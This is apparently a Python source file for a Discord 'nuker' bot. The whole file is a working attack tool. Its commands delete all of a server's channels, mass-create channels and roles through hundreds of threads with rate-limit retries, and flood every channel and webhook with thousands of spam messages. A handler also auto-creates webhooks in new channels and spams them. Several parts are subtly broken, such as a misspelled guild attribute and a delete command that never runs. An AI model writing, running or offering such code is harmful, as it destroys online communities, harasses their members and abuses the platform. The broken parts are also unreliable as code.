import sys, discord, requests, json, threading, random, asyncio,aiohttp, time
from discord.ext import commands
import colorama
from colorama import Fore, Style, Back
from time import sleep
from datetime import datetime

now = datetime.now()
ftime = now.strftime("%H:%M:%S")

session = requests.Session()

channels = open('channels.txt')
token = input("Token: ")
prefix = input("Prefix: ")
stats = input("Status: ")
chan = input("Channel Name: ")
spamdata = input("Spam content: ")
rol = input("Spam Roles: ")
webname = input("Spam Webhook names: ")
amountss = 1000
intents = discord.Intents().all()
intents.message_content = True
bot = commands.Bot(command_prefix=prefix, intents=intents)
bot.remove_command("help")

if bot:
  headers = {
    "Authorization": 
      f"Bot {token}"
  }
else:
  headers = {
    "Authorization": 
      token
  }



@bot.event
async def on_ready():
    await bot.change_presence(activity=discord.Game(stats))
    print("""$$\    $$\ $$$$$$\ $$$$$$$\  $$$$$$$$\ $$$$$$$\        $$\   $$\ $$\   $$\ $$$$$$$\  
$$ |   $$ |\_$$  _|$$  __$$\ $$  _____|$$  __$$\       $$$\  $$ |$$ | $$  |$$  __$$\ 
$$ |   $$ |  $$ |  $$ |  $$ |$$ |      $$ |  $$ |      $$$$\ $$ |$$ |$$  / $$ |  $$ |
\$$\  $$  |  $$ |  $$$$$$$  |$$$$$\    $$$$$$$  |      $$ $$\$$ |$$$$$  /  $$$$$$$  |
 \$$\$$  /   $$ |  $$  ____/ $$  __|   $$  __$$<       $$ \$$$$ |$$  $$<   $$  __$$< 
  \$$$  /    $$ |  $$ |      $$ |      $$ |  $$ |      $$ |\$$$ |$$ |\$$\  $$ |  $$ |
   \$  /   $$$$$$\ $$ |      $$$$$$$$\ $$ |  $$ |      $$ | \$$ |$$ | \$$\ $$ |  $$ |
    \_/    \______|\__|      \________|\__|  \__|      \__|  \__|\__|  \__|\__|  \__|
                                                                                     
                                                                                     
                                                                                     """)
    print(Fore.GREEN+"Commands - nuke,scc,sdc,sdr,scr,spam,swh")
    print(Fore.GREEN+f"Logged in as {bot.user.name}")
    print(Fore.GREEN+f"Prefix - {prefix}")
    print("Remember to Use scrape.py before running the nuker")

def logo():
    print(f"Logged in as {bot.user.name}")
    print(f"Prefix - {prefix}")

@bot.command()
async def scc(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def spc(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/channels",
           headers=headers,
           json=json
        )
    for i in range(500):
           threading.Thread(
             target=spc,
             args=(chan, )
           ).start()

@bot.command()
async def scr(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def scrr(i):
        json = {
          "name": i
        }
        session.post(
           f"https://discord.com/api/v9/guilds/{guild}/roles",
           headers=headers,
           json=json
        )
    for i in range(250):
           threading.Thread(
             target=scrr,
             args=(chan, )
           ).start()

@bot.command()
async def sdr(ctx):
    await ctx.message.delete()
    for role in list(ctx.guild.role):
        await role.delete()

@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    guild = ctx.guild.id
    def channel_delete(u):
      while True:
        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
        else:
          break
    def cc(i):
        json = {
          "name": i
        }
        session.post(
          f"https://discord.com/api/v9/guilds/{guild}/channels",
          headers=headers,
          json=json
        )
    for i in range(250):
           for channel in list(ctx.guild.channels):   
               threading.Thread(
                    target=channel_delete,
                    args=(channel.id, )
               ).start()
    for i in range(250):
           threading.Thread(
             target=cc,
             args=(chan, )
           ).start()

@bot.command()
async def sdc(ctx):
    def channel_delete(u):
      while True:
        r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
        if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
        else:
          break

@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    amountspam = 1000
    for i in range(amountspam):
        for channel in ctx.guild.channels:
            await channel.send(spamdata)

@bot.command()
async def swh(ctx):
    await ctx.message.delete()
    amountspam = 10000
    for i in range(amountspam):
        for webhook in ctx.guild.webhooks:
            await webhook.send(spamdata)

@bot.event
async def on_guild_channel_create(channel):
        try:
            webhook = await channel.create_webhook(name=webname)
            for i in range(10000):   
                 await webhook.send(spamdata)
        except:
            return



bot.run(token)
